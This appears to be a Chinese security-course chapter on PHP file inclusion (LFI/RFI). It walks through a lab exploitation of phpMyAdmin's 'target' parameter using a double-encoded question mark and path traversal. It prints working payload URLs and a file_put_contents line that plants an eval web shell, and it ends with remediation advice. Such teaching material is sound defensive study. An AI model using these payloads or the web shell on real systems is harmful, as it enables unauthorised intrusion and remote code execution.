# Chapter 9.1 本地包含与远程包含

## 0x00 漏洞简介

> 文件包含漏洞属于攻击者利用包含的特性，加上应用本身对文件包含控制不严格，最终造成攻击者进行任意文件包含。被包含的文件会被作为脚本文件执行。

文件包含本身不属于漏洞，但是由于对包含的文件控制不当，导致了文件包含漏洞的产生。

文件包含分为本地包含（LFI）和远程包含（RFI），即文件读取的地址在本地或远程。远程包含需要参数`allow_url_include = ON`

### 解析函数

`include()`：使用include()引用外部文件时，只有代码执行到include()代码段时调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统会给出警告错误后继续执行。

`require()`：在脚本文件执行前解析器会将引用的文件全部读取后与源文件中本语句替换，组合成为新的临时PHP文件并执行。

`include_once()`和`require_once()`：与include()和require()基础功能相同，执行前会先验证同一页面中是否被其他位置引用过，如果有则不会重复引用。对于require_once()而言如果一个页面用用了两个不同文件，则只有第一个文件会被执行。

## 0x01 漏洞复现

1. **下载PHPMyadmin源码进行审计，全局搜索文件包含函数**

	![](https://nc0.cdn.zkaq.cn/md/5371/cdeee58118c41ed80fcfda35ccb23c6e_24229.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/469c05cbccb1074f654cc64609c6e5dc_44449.png)
2. **追踪到一个request传参的包含，对其中的条件及正则进行验证**

   > 1. target传参非空
   > 2. target传参不为index目录
   > 3. target传参不在名单里
   > 4. 通过Core.php中checkPageValidity()函数验证

	![](https://nc0.cdn.zkaq.cn/md/5371/897608641a6b0565e11e704d476095dd_33420.png)

3. **追踪Core.php中checkPageValidity()验证**

   > 1. IF1:如果不存在缓存白名单则从固定白名单中获取
   > 2. IF2:如果变量page未设置或变量page不为字符串则返回false
   > 3. IF3:如果变量page在白名单里则返回true
   > 4. 新建临时变量_page，赋值为截取page变量中从0至'?'第一次出现的位置的字符串
   > 5. IF4:如果临时变量_page在白名单中则返回true
   > 6. _page赋值为url编码后的page
   > 7. _page赋值为截取page变量中从0至'?'第一次出现的位置的字符串
   > 8. IF5:如果临时变量_page在白名单中则返回true
   >
   > 综上所述，只能通过第7、8点截取page传参时加入payload才有机会注入
![](https://nc0.cdn.zkaq.cn/md/5371/983c86abe2112a057edda6d641465479_21005.png)

4. **从phpMyAdmin中可以看到数据库的结构，其中表数据库的test中的表名和`C:\phpStudy\PHPTutorial\MySQL\data\test`中的frm文件相同，所以可以尝试跳转**

	![](https://nc0.cdn.zkaq.cn/md/5371/931e18fdfb0f613501daee91afa63e97_52729.png)
5. **新建一张表，添加列名为一句话木马，观察到bin打开后仍然可见木马，可以尝试使用文件执行漏洞**

	![](https://nc0.cdn.zkaq.cn/md/5371/f7f0f11e0e654c8ff49d1e0e5f7c9db1_24032.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/036171bd83e91695f6c86a7b75a72ba0_74100.png)
6. **构建payload，在index.php使用target传参，访问白名单内的任意文件，并使用第二个`?`对第三步第7点的临时变量_page截取后传参（默认截取第二个问号后的内容）。但是由于URL不能直接传参"?"并且在第三步第6点可知后端会对传参进行第二次URL编码，所以我们将"?"进行两次编码：`? -> %3f -> %253f`。此后加上相对路径访问构造的shell.frm，读取到phpinfo**

   ```url
   http://localhost/phpMyAdmin/?target=sql.php%253f/../../../MySQL/data/test/shell.frm&$2=phpinfo();
   ```

	![](https://nc0.cdn.zkaq.cn/md/5371/fb7ad28e8beaeca558c356ea9cccb371_38481.png)
7. **在靶场重复步骤：新建表shell及一句话木马字段，构建payload访问**

   ```url
   http://59.63.200.79:8010/lfi/phpmyadmin/?target=sql.php%253f/../../../../mysql/data/a/shell.frm&&2=phpinfo();
   ```

	![](https://nc0.cdn.zkaq.cn/md/5371/05f1426ecf8d7aa280f5df77560b9555_40812.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/ceef47470deac5e55c1c532595617a89_88252.png)

8. **虽然已经向数据库写入了一句话木马，但是并不能直接连接菜刀，因为访问这个cms是需要用户权限的，所以我们在传参点使用file_put_contents()函数新建一个不需要权限就能访问的php文件**

	```php
	file_put_contents('she11.php','<?php eval($_REQUEST[2])?>');
	```

	![](https://nc0.cdn.zkaq.cn/md/5371/55f9268d0317e99a188e9588e66d3f42_35268.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/c1074c01d4911a37573e36cef9a357da_61894.png)
9. 连接菜刀，拿到flag

	![](https://nc0.cdn.zkaq.cn/md/5371/aa1908d1193aeafba96168d152b24f3d_61121.png)
## 0x02 修复方法

1. 在没有特别需要的情况下设置`allow_url_include`和`allow_url_fopen`为`off`，防止远程包含
2. 对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir
3. 假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现`../`之类的目录跳转符。
4. 严格检查include类的文件包含函数中的参数是否外界可控

